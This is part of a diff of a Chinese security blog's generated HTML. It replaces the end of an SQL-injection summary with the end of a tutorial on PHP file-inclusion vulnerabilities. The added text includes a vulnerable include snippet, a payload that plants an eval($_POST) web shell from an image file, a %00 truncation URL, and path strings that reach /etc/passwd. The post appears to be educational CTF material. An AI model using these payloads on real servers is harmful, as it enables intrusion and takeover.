+<h3 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h3><p>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    Include  $_GET[&apos;page&apos;].&quot;.php&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x10-常用sql语句"><a href="#0x10-常用sql语句" class="headerlink" title="0x10 常用sql语句"></a>0x10 常用sql语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">选择：select * from table1 where 范围 </span><br><span class="line">插入：insert into table1(field1,field2) values(value1,value2) </span><br><span class="line">删除：delete from table1 where 范围 </span><br><span class="line">更新：update table1 set field1=value1 where 范围 </span><br><span class="line">查找：select * from table1 where field1 like &apos;%value1%&apos; </span><br><span class="line">排序：select * from table1 order by field1,field2 [desc] </span><br><span class="line">总数：select count as totalcount from table1 </span><br><span class="line">求和：select sum(field1) as sumvalue from table1 </span><br><span class="line">平均：select avg(field1) as avgvalue from table1 </span><br><span class="line">最大：select max(field1) as maxvalue from table1 </span><br><span class="line">最小：select min(field1) as minvalue from table1</span><br></pre></td></tr></table></figure>
+<h4 id="00截断包含"><a href="#00截断包含" class="headerlink" title="%00截断包含"></a>%00截断包含</h4><p>新建file.jpg，写入内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[key]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UNION 运算符 </span><br><span class="line">UNION 运算符通过组合其他两个结果表（例如 TABLE1 和 TABLE2）并消去表中任何重复行而派生 </span><br><span class="line">出一个结果表。当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行。两种情况下，派 </span><br><span class="line">生表的每一行不是来自 TABLE1 就是来自 TABLE2。 </span><br><span class="line">EXCEPT 运算符 </span><br><span class="line">EXCEPT 运算符通过包括所有在 TABLE1 中但不在 TABLE2 中的行并消除所有重复行而派生出一个 </span><br><span class="line">结果表。当 ALL 随 EXCEPT 一起使用时 (EXCEPT ALL)，不消除重复行。 </span><br><span class="line">INTERSECT 运算符 </span><br><span class="line">INTERSECT 运算符通过只包括 TABLE1 和 TABLE2 中都有的行并消除所有重复行而派生出一个结果 </span><br><span class="line">表。当 ALL 随 INTERSECT 一起使用时 (INTERSECT ALL)，不消除重复行。 </span><br><span class="line">注：使用运算词的几个查询结果行必须是一致的。</span><br></pre></td></tr></table></figure>
+<p>　　这样的话比如上传一个file.jpg图片马，则访问<a href="http://www.xxx.com/file.jpg" target="_blank" rel="noopener">http://www.xxx.com/file.jpg</a><br>时，访问的是file.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问<a href="http://www.xxx.com/file.jpg%00" target="_blank" rel="noopener">http://www.xxx.com/file.jpg%00</a></p>
+<h4 id="使用长目录截断"><a href="#使用长目录截断" class="headerlink" title="使用长目录截断"></a>使用长目录截断</h4><p>常用绕过方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">././././././././././././././etc/passwd</span><br><span class="line"></span><br><span class="line">////////////////////////////etc/passwd</span><br><span class="line"></span><br><span class="line">../a/etc/passwd/../a/etc/passwd/../a/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。所以成功绕过</p>
+
       
     </div>
     
@@ -565,7 +560,7 @@ admin&apos;/*
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://kevens10.github.io/2019/10/20/SQL注入总结/" title="SQL注入总结">https://kevens10.github.io/2019/10/20/SQL注入总结/</a>
+    <a href="https://kevens10.github.io/2019/11/09/文件包含漏洞/" title="文件包含漏洞">https://kevens10.github.io/2019/11/09/文件包含漏洞/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -595,9 +590,11 @@ admin&apos;/*
           
             <a href="/tags/CTF-Web/" rel="tag"><i class="fa fa-tag"></i> CTF Web</a>
           
-            <a href="/tags/SQL注入漏洞/" rel="tag"><i class="fa fa-tag"></i> SQL注入漏洞</a>
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
           
-            <a href="/tags/数据库/" rel="tag"><i class="fa fa-tag"></i> 数据库</a>
+            <a href="/tags/后端/" rel="tag"><i class="fa fa-tag"></i> 后端</a>
+          
+            <a href="/tags/文件包含漏洞/" rel="tag"><i class="fa fa-tag"></i> 文件包含漏洞</a>
           
         </div>
       
@@ -622,8 +619,8 @@ admin&apos;/*
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/19/仿射密码/" rel="next" title="仿射密码">
-                <i class="fa fa-chevron-left"></i> 仿射密码
+              <a href="/2019/11/07/XSS漏洞/" rel="next" title="XSS漏洞">
+                <i class="fa fa-chevron-left"></i> XSS漏洞
               </a>
             
           </div>
@@ -631,10 +628,6 @@ admin&apos;/*
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/20/SQL回显注入/" rel="prev" title="SQL回显注入">
-                SQL回显注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -903,7 +896,7 @@ admin&apos;/*
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-SQL注入原理与分类"><span class="nav-number">1.</span> <span class="nav-text">0x00 SQL注入原理与分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">1.2.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1"><span class="nav-number">1.2.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2"><span class="nav-number">1.2.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3"><span class="nav-number">1.2.3.</span> <span class="nav-text">3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-注入常见参数"><span class="nav-number">2.</span> <span class="nav-text">0X01 注入常见参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-后台万能密码"><span class="nav-number">3.</span> <span class="nav-text">0x02 后台万能密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Mysql相关知识"><span class="nav-number">4.</span> <span class="nav-text">0x03 Mysql相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql中注释符：-、-、-–"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">mysql中注释符：#   、/**/  、  –</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#information-schema数据库中三个很重要的表："><span class="nav-number">4.0.0.2.</span> <span class="nav-text">information_schema数据库中三个很重要的表：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常用函数"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">常用函数</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-判断是否存在SQL注入"><span class="nav-number">5.</span> <span class="nav-text">0x04 判断是否存在SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-获取数据库名"><span class="nav-number">6.</span> <span class="nav-text">0x05 获取数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-获取表名"><span class="nav-number">7.</span> <span class="nav-text">0x06 获取表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-获取列名"><span class="nav-number">8.</span> <span class="nav-text">0x07 获取列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-查询结果"><span class="nav-number">9.</span> <span class="nav-text">0x08 查询结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-常用的绕过"><span class="nav-number">10.</span> <span class="nav-text">0x09 常用的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过引号限制"><span class="nav-number">10.0.0.1.</span> <span class="nav-text">绕过引号限制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过字符串黑名单"><span class="nav-number">10.0.0.2.</span> <span class="nav-text">绕过字符串黑名单</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过逗号"><span class="nav-number">10.0.0.3.</span> <span class="nav-text">绕过逗号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#比较符-lt-gt-绕过"><span class="nav-number">10.0.0.4.</span> <span class="nav-text">比较符(&lt;,&gt;)绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-常用sql语句"><span class="nav-number">11.</span> <span class="nav-text">0x10 常用sql语句</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-文件包含与文件包含漏洞"><span class="nav-number">1.</span> <span class="nav-text">0x00 文件包含与文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-文件包含函数"><span class="nav-number">2.</span> <span class="nav-text">0x01 文件包含函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞产生原因"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-文件包含利用"><span class="nav-number">4.</span> <span class="nav-text">0x05 文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#读取敏感信息"><span class="nav-number">4.1.</span> <span class="nav-text">读取敏感信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见敏感信息路径"><span class="nav-number">4.1.1.</span> <span class="nav-text">常见敏感信息路径</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows系统"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">Windows系统</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Linux-Unix系统"><span class="nav-number">4.1.1.2.</span> <span class="nav-text">Linux/Unix系统</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session文件包含漏洞-待续"><span class="nav-number">4.2.</span> <span class="nav-text">session文件包含漏洞(待续)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程包含shell"><span class="nav-number">4.3.</span> <span class="nav-text">远程包含shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用php协议进行包含"><span class="nav-number">4.4.</span> <span class="nav-text">利用php协议进行包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地包含配合文件上传"><span class="nav-number">4.5.</span> <span class="nav-text">本地包含配合文件上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-绕过方法"><span class="nav-number">5.</span> <span class="nav-text">0x06 绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#问号绕过"><span class="nav-number">5.1.</span> <span class="nav-text">问号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#井号绕过"><span class="nav-number">5.2.</span> <span class="nav-text">井号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截断包含"><span class="nav-number">5.3.</span> <span class="nav-text">截断包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#00截断包含"><span class="nav-number">5.3.1.</span> <span class="nav-text">%00截断包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用长目录截断"><span class="nav-number">5.3.2.</span> <span class="nav-text">使用长目录截断</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
